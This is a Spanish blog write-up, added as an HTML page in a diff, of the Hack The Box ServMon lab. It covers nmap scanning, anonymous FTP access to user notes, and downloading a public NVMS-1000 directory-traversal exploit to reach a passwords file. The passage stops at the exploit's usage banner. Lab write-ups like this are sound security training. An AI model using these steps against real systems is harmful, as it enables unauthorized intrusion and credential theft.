@@ -1,0 +1,1175 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Hack The Box ServMon - K4miyo      Ciberseguridad!      </title>
+<meta name="description" content="Resolución de la máquina ServMon en la plataforma de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
+<meta property="og:title" content="Hack The Box ServMon">
+<meta property="og:url" content="http://localhost:4000/htb-servmon/">
+
+
+  <meta property="og:description" content="Resolución de la máquina ServMon en la plataforma de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-servmon/servmon.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2022-01-15T00:00:00-06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-servmon/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "K4miyo",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links">
+<li class="masthead__menu-item">
+              <a href="/">Home</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/year-archive/">Artículos</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/categories/">Categorías</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/tags/">Etiquetas</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/buscador/">Buscador</a>
+            </li>
+<li class="masthead__menu-item">
+              <a href="/about/">Contacto</a>
+            </li>
+</ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1">
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Hack The Box ServMon</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">K4miyo</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cyber Threat Intelligence Analyst
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hack The Box ServMon">
+    <meta itemprop="description" content="Resolución de la máquina ServMon en la plataforma de Hack The Box">
+    <meta itemprop="datePublished" content="January 15, 2022">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box ServMon
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2022-01-15T00:00:00-06:00">January 15, 2022 </time> 
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-servmon/banner-servmon.jpg" alt=""></p>
+
+<h2 id="servmon">ServMon</h2>
+<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.184.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.184
+PING 10.10.10.184 <span class="o">(</span>10.10.10.184<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.184: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>324 ms
+
+<span class="nt">---</span> 10.10.10.184 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 324.431/324.431/324.431/0.000 ms
+</code></pre></div></div>
+
+<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.184 <span class="nt">-oG</span> allPorts
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-01-15 19:53 CST
+Initiating SYN Stealth Scan at 19:53        
+Scanning 10.10.10.184 <span class="o">[</span>65535 ports]        
+Discovered open port 445/tcp on 10.10.10.184  
+Discovered open port 135/tcp on 10.10.10.184  
+Discovered open port 21/tcp on 10.10.10.184   
+Discovered open port 22/tcp on 10.10.10.184   
+Discovered open port 139/tcp on 10.10.10.184 
+Discovered open port 80/tcp on 10.10.10.184  
+Discovered open port 49665/tcp on 10.10.10.184
+Discovered open port 49668/tcp on 10.10.10.184
+Discovered open port 49666/tcp on 10.10.10.184
+Discovered open port 49669/tcp on 10.10.10.184
+Discovered open port 5666/tcp on 10.10.10.184 
+Discovered open port 6063/tcp on 10.10.10.184
+Discovered open port 49670/tcp on 10.10.10.184                                                                                   
+Discovered open port 8443/tcp on 10.10.10.184
+Discovered open port 49664/tcp on 10.10.10.184
+Discovered open port 6699/tcp on 10.10.10.184
+Discovered open port 49667/tcp on 10.10.10.184                                                                                   
+Discovered open port 5040/tcp on 10.10.10.184                                                                                    
+Completed SYN Stealth Scan at 19:53, 15.86s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.184           
+Host is up, received user-set <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2022-01-15 19:53:26 CST <span class="k">for </span>15s  
+Not shown: 63964 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>, 1553 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT      STATE SERVICE      REASON
+21/tcp    open  ftp          syn-ack ttl 127
+22/tcp    open  ssh          syn-ack ttl 127
+80/tcp    open  http         syn-ack ttl 127
+135/tcp   open  msrpc        syn-ack ttl 127
+139/tcp   open  netbios-ssn  syn-ack ttl 127
+445/tcp   open  microsoft-ds syn-ack ttl 127
+5040/tcp  open  unknown      syn-ack ttl 127
+5666/tcp  open  nrpe         syn-ack ttl 127
+6063/tcp  open  x11          syn-ack ttl 127
+6699/tcp  open  napster      syn-ack ttl 127
+8443/tcp  open  https-alt    syn-ack ttl 127
+49664/tcp open  unknown      syn-ack ttl 127
+49665/tcp open  unknown      syn-ack ttl 127
+49666/tcp open  unknown      syn-ack ttl 127
+49667/tcp open  unknown      syn-ack ttl 127
+49668/tcp open  unknown      syn-ack ttl 127
+49669/tcp open  unknown      syn-ack ttl 127
+49670/tcp open  unknown      syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>15.96 seconds
+           Raw packets sent: 78068 <span class="o">(</span>3.435MB<span class="o">)</span> | Rcvd: 65689 <span class="o">(</span>2.628MB<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+   3   │ 
+   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.184
+   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 21,22,80,135,139,445,5040,5666,6063,6699,8443,49664,49665,49666,49667,49668,49669,49670
+   6   │ 
+   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+</code></pre></div></div>
+
+<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sCV</span> <span class="nt">-p21</span>,22,80,135,139,445,5040,5666,6063,6699,8443,49664,49665,49666,49667,49668,49669,49670 10.10.10.184 <span class="nt">-oN</span> targeted  
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2022-01-15 19:54 CST                                                                  
+Nmap scan report <span class="k">for </span>10.10.10.184                                                                                                
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>                                                                                                      
+                                                                                                                                 
+PORT      STATE SERVICE       VERSION                                                                                            
+21/tcp    open  ftp           Microsoft ftpd                                                                                     
+| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>                                                                           
+|_01-18-20  11:05AM       &lt;DIR&gt;          Users                                                                                   
+| ftp-syst:                                                                                                                      
+|_  SYST: Windows_NT                                                                                                             
+22/tcp    open  ssh           OpenSSH for_Windows_7.7 <span class="o">(</span>protocol 2.0<span class="o">)</span>                                                             
+| ssh-hostkey:                                                                                                                   
+|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 <span class="o">(</span>RSA<span class="o">)</span>                                                                   
+|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 <span class="o">(</span>ECDSA<span class="o">)</span>                                                                  
+|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e <span class="o">(</span>ED25519<span class="o">)</span>                                                                
+80/tcp    open  http                                                                                                             
+|_http-title: Site doesn<span class="s1">'t have a title (text/html).                                                                             
+| fingerprint-strings:                                                                                                           
+|   GetRequest, HTTPOptions, RTSPRequest:                                                                                        
+|     HTTP/1.1 200 OK                                                                                                            
+|     Content-type: text/html                                                                                                    
+|     Content-Length: 340                                                                                                        
+|     Connection: close                                                                                                          
+|     AuthInfo:                                                                                                                  
+|     &lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;  
+|     &lt;html xmlns="http://www.w3.org/1999/xhtml"&gt;                                                                                
+|     &lt;head&gt;                                                                                                                     
+|     &lt;title&gt;&lt;/title&gt;                                                                                                            
+|     &lt;script type="text/javascript"&gt;                                                                                            
+|     window.location.href = "Pages/login.htm";                                                                                  
+|     &lt;/script&gt;                                                                                                                  
+|     &lt;/head&gt;                                                   
+|     &lt;body&gt;                                                    
+|     &lt;/body&gt;                                                   
+|     &lt;/html&gt;                                                   
+|   NULL:                                                       
+|     HTTP/1.1 408 Request Timeout                 
+|     Content-type: text/html                                                                                                    
+|     Content-Length: 0                                         
+|     Connection: close                                                                                                          
+|_    AuthInfo:
+135/tcp   open  msrpc         Microsoft Windows RPC                                                                              
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                                                      
+445/tcp   open  microsoft-ds?                                                                                                    
+5040/tcp  open  unknown                                                                                                          
+5666/tcp  open  tcpwrapped                                                                                                       
+6063/tcp  open  x11?                                                                                                             
+6699/tcp  open  napster?                                                                                                         
+8443/tcp  open  ssl/https-alt
+| fingerprint-strings: 
+|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
+|     HTTP/1.1 404
+|     Content-Length: 18
+|     Document not found
+|   GetRequest: 
+|     HTTP/1.1 302
+|     Content-Length: 0
+|     Location: /index.html
+|     iday
+|_    :Saturday
+| ssl-cert: Subject: commonName=localhost
+| Not valid before: 2020-01-14T13:24:20
+|_Not valid after:  2021-01-13T13:24:20
+| http-title: NSClient++
+|_Requested resource was /index.html
+|_ssl-date: TLS randomness does not represent time
+49664/tcp open  msrpc         Microsoft Windows RPC
+49665/tcp open  msrpc         Microsoft Windows RPC
+49666/tcp open  msrpc         Microsoft Windows RPC
+49667/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49669/tcp open  msrpc         Microsoft Windows RPC
+49670/tcp open  msrpc         Microsoft Windows RPC
+2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at http
+s://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port80-TCP:V=7.92%I=7%D=1/15%Time=61E37ADB%P=x86_64-pc-linux-gnu%r(NULL
+SF:,6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/ht
+SF:ml\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
+SF:\r\n")%r(GetRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20tex
+SF:t/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x
+SF:20\r\n\r\n\xef\xbb\xbf&lt;!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20X
+SF:HTML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/D
+SF:TD/xhtml1-transitional\.dtd\"&gt;\r\n\r\n&lt;html\x20xmlns=\"http://www\.w3\.
+SF:org/1999/xhtml\"&gt;\r\n&lt;head&gt;\r\n\x20\x20\x20\x20&lt;title&gt;&lt;/title&gt;\r\n\x20\
+SF:x20\x20\x20&lt;script\x20type=\"text/javascript\"&gt;\r\n\x20\x20\x20\x20\x20
+SF:\x20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x2
+SF:0\x20\x20\x20&lt;/script&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n")
+SF:%r(HTTPOptions,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
+SF:l\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\
+SF:n\r\n\xef\xbb\xbf&lt;!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\
+SF:x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xh
+SF:tml1-transitional\.dtd\"&gt;\r\n\r\n&lt;html\x20xmlns=\"http://www\.w3\.org/1
+SF:999/xhtml\"&gt;\r\n&lt;head&gt;\r\n\x20\x20\x20\x20&lt;title&gt;&lt;/title&gt;\r\n\x20\x20\x
+SF:20\x20&lt;script\x20type=\"text/javascript\"&gt;\r\n\x20\x20\x20\x20\x20\x20\
+SF:x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20
+SF:\x20\x20&lt;/script&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n")%r(RT
+SF:SPRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\n
+SF:Content-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n
+SF:\xef\xbb\xbf&lt;!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\
+SF:.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-
+SF:transitional\.dtd\"&gt;\r\n\r\n&lt;html\x20xmlns=\"http://www\.w3\.org/1999/x
+SF:html\"&gt;\r\n&lt;head&gt;\r\n\x20\x20\x20\x20&lt;title&gt;&lt;/title&gt;\r\n\x20\x20\x20\x2
+SF:0&lt;script\x20type=\"text/javascript\"&gt;\r\n\x20\x20\x20\x20\x20\x20\x20\x
+SF:20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\
+SF:x20&lt;/script&gt;\r\n&lt;/head&gt;\r\n&lt;body&gt;\r\n&lt;/body&gt;\r\n&lt;/html&gt;\r\n");
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port8443-TCP:V=7.92%T=SSL%I=7%D=1/15%Time=61E37AE4%P=x86_64-pc-linux-gn
+SF:u%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation
+SF::\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0iday\0\0\0\0:Saturday\0\0\
+SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0")%r(HTTPOptio
+SF:ns,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not
+SF:\x20found")%r(FourOhFourRequest,36,"HTTP/1\.1\x20404\r\nContent-Length:
+SF:\x2018\r\n\r\nDocument\x20not\x20found")%r(RTSPRequest,36,"HTTP/1\.1\x2
+SF:0404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(SIPOp
+SF:tions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20
+SF:not\x20found");
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: 59m59s
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2022-01-16T02:57:16
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 193.02 seconds
+</span></code></pre></div></div>
+
+<p>Vemos que está abierto el puerto 21 asociado al servicio FTP y que podríamos ingresar como el usuario <strong>anonymous</strong>, así que vamos a validarlo.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ftp 10.10.10.184
+Connected to 10.10.10.184.
+220 Microsoft FTP Service
+Name <span class="o">(</span>10.10.10.184:k4miyo<span class="o">)</span>: anonymous
+331 Anonymous access allowed, send identity <span class="o">(</span>e-mail name<span class="o">)</span> as password.
+Password:
+230 User logged <span class="k">in</span><span class="nb">.</span>
+Remote system <span class="nb">type </span>is Windows_NT.
+ftp&gt; <span class="nb">dir
+</span>200 PORT <span class="nb">command </span>successful.
+125 Data connection already open<span class="p">;</span> Transfer starting.
+01-18-20  11:05AM       &lt;DIR&gt;          Users
+226 Transfer complete.
+ftp&gt; 
+</code></pre></div></div>
+
+<p>Tenemos algunso recursos de podemos traer a nuestra máquina.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ftp&gt; <span class="nb">cd </span>Users
+250 CWD <span class="nb">command </span>successful.
+ftp&gt; <span class="nb">dir
+</span>200 PORT <span class="nb">command </span>successful.
+125 Data connection already open<span class="p">;</span> Transfer starting.
+01-18-20  11:06AM       &lt;DIR&gt;          Nadine
+01-18-20  11:08AM       &lt;DIR&gt;          Nathan
+226 Transfer complete.
+ftp&gt; <span class="nb">cd </span>Nadine
+250 CWD <span class="nb">command </span>successful.
+ftp&gt; <span class="nb">dir
+</span>200 PORT <span class="nb">command </span>successful.
+125 Data connection already open<span class="p">;</span> Transfer starting.
+01-18-20  11:08AM                  174 Confidential.txt
+226 Transfer complete.
+ftp&gt; get Confidential.txt
+<span class="nb">local</span>: Confidential.txt remote: Confidential.txt
+200 PORT <span class="nb">command </span>successful.
+125 Data connection already open<span class="p">;</span> Transfer starting.
+226 Transfer complete.
+174 bytes received <span class="k">in </span>0.14 secs <span class="o">(</span>1.2033 kB/s<span class="o">)</span>
+ftp&gt; <span class="nb">cd</span> ..
+250 CWD <span class="nb">command </span>successful.
+ftp&gt; <span class="nb">cd </span>Nathan
+250 CWD <span class="nb">command </span>successful.
+ftp&gt; <span class="nb">dir
+</span>200 PORT <span class="nb">command </span>successful.
+125 Data connection already open<span class="p">;</span> Transfer starting.
+01-18-20  11:10AM                  186 Notes to <span class="k">do</span>.txt
+226 Transfer complete.
+ftp&gt; get <span class="s2">"Notes to do.txt"</span>
+<span class="nb">local</span>: Notes to <span class="k">do</span>.txt remote: Notes to <span class="k">do</span>.txt
+200 PORT <span class="nb">command </span>successful.
+125 Data connection already open<span class="p">;</span> Transfer starting.
+226 Transfer complete.
+186 bytes received <span class="k">in </span>0.14 secs <span class="o">(</span>1.3012 kB/s<span class="o">)</span>
+ftp&gt;
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>Confidential.txt
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: Confidential.txt
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ Nathan,
+   2   │ 
+   3   │ I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back i
+       │ nto the secure folder.
+   4   │ 
+   5   │ Regards
+   6   │ 
+   7   │ Nadine
+</code></pre></div></div>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>Notes<span class="se">\ </span>to<span class="se">\ </span><span class="k">do</span>.txt
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: Notes to <span class="k">do</span>.txt
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 1<span class="o">)</span> Change the password <span class="k">for </span>NVMS - Complete
+   2   │ 2<span class="o">)</span> Lock down the NSClient Access - Complete
+   3   │ 3<span class="o">)</span> Upload the passwords
+   4   │ 4<span class="o">)</span> Remove public access to NVMS
+   5   │ 5<span class="o">)</span> Place the secret files <span class="k">in </span>SharePoint
+</code></pre></div></div>
+
+<p>Tenemos algo como un tipo correo, una lista de cosas y nombres potenciales de usuarios a nivel de sistema. Vamos a seguir enumerando un poco el sistema y tenemos el puerto 445 abierto, por lo que podriamos tratar de hacer un <strong><em>Null Session</em></strong>; sin embargo, no tenemos acceso. Asi que ahora vamos a ir por los servicios web, tirando primeramente de la herramienta <code class="language-plaintext highlighter-rouge">whatweb</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cat </span>targeted | <span class="nb">grep </span>http | <span class="nb">grep</span> <span class="nt">-oP</span> <span class="s1">'\d{1,4}/tcp'</span> | <span class="nb">awk</span> <span class="s1">'{print $1}'</span> <span class="nv">FS</span><span class="o">=</span>/ | xargs | <span class="nb">tr</span> <span class="s2">" "</span> <span class="s2">","</span>
+80,8443
+❯ whatweb http://10.10.10.184/
+http://10.10.10.184/ <span class="o">[</span>200 OK] Country[RESERVED][ZZ], IP[10.10.10.184], Script[text/javascript], UncommonHeaders[authinfo]
+❯ whatweb https://10.10.10.184:8443/
+https://10.10.10.184:8443/ <span class="o">[</span>302 Found] Country[RESERVED][ZZ], IP[10.10.10.184], RedirectLocation[/index.html]
+https://10.10.10.184:8443/index.html <span class="o">[</span>200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, IP[10.10.10.184], Script[text/javascript], Title[NSClient++], X-UA-Compatible[IE<span class="o">=</span>edge]
+</code></pre></div></div>
+
+<p>Ahora si vamos a echarles un ojo vía web.</p>
+
+<p><img src="/assets/images/htb-servmon/servmon-web.png" alt=""></p>
+
+<p><img src="/assets/images/htb-servmon/servmon-web1.png" alt=""></p>
+
+<p>Vamos a empezar por el puerto 80 en donde tenemos un panel de login de <strong>NVMS-1000</strong>, que si no sabemos que es lo podemos buscar en internet (<em>Software NVMS1000 para centralización de grabadores y cámaras IP Meriva para SO</em>). Podríamos probar credenciales default, pero vemos que no accedemos; podríamos ver si existe algún exploit público.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ searchsploit nvms 1000
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+ Exploit Title                                                                                 |  Path
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+NVMS 1000 - Directory Traversal                                                                | hardware/webapps/47774.txt
+TVT NVMS 1000 - Directory Traversal                                                            | hardware/webapps/48311.py
+<span class="nt">-----------------------------------------------------------------------------------------------</span> <span class="nt">---------------------------------</span>
+Shellcodes: No Results
+Papers: No Results
+</code></pre></div></div>
+
+<p>Tenemos unos dos que hacen referencia a <em>Directory Traversal</em> de forma que podemos leer archivos del sistema y aquí nos preguntamos para que nos sirve; pues bueno, resulta que el usuario <strong>Nadine</strong> le comenta al usuario <strong>Nathan</strong> que en su escritorio dejo un archivo llamado <strong>Passwords.txt</strong>; por lo que ya tenemos una posible ruta <code class="language-plaintext highlighter-rouge">C:\Users\Nathan\Desktop\</code> y un archivo a leer <code class="language-plaintext highlighter-rouge">Passwords.txt</code>, así que usaremos la herramienta <a href="https://github.com/AleDiBen/NVMS1000-Exploit/blob/master/nvms.py">nvms.py</a>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ wget https://raw.githubusercontent.com/AleDiBen/NVMS1000-Exploit/master/nvms.py
+<span class="nt">--2022-01-15</span> 21:45:28--  https://raw.githubusercontent.com/AleDiBen/NVMS1000-Exploit/master/nvms.py
+Resolviendo raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)</span>... 185.199.109.133, 185.199.108.133, 185.199.111.133, ...
+Conectando con raw.githubusercontent.com <span class="o">(</span>raw.githubusercontent.com<span class="o">)[</span>185.199.109.133]:443... conectado.
+Petición HTTP enviada, esperando respuesta... 200 OK
+Longitud: 3032 <span class="o">(</span>3.0K<span class="o">)</span> <span class="o">[</span>text/plain]
+Grabando a: «nvms.py»
+
+nvms.py                          100%[<span class="o">=======================================================&gt;]</span>   2.96K  <span class="nt">--</span>.-KB/s    en 0s      
+
+2022-01-15 21:45:29 <span class="o">(</span>60.3 MB/s<span class="o">)</span> - «nvms.py» guardado <span class="o">[</span>3032/3032]
+❯ python3 nvms.py
+<span class="k">****************************************************************</span>
+<span class="k">**</span>                      ~CVE 2019-20085~                      <span class="k">**</span>
+<span class="k">****************************************************************</span>
+
+USAGE  :
